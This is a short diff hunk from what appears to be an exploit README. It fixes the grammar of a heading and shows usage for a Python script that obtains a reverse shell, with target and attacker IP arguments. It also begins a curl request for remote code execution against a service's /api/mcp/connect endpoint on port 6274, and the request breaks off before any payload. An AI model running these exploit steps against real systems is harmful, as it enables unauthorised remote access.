@@ -17,7 +17,7 @@ Python3 script that sets up a listener and gets a reverse shell back.
 Usage:
     python3 exploit.py <target_ip> <your_ip> <your_port>
     
-### You can use also get RCE using (curl):
+### You can also get RCE using (curl):
 
 ```bash
 curl -s http://<TARGET_IP>:6274/api/mcp/connect \
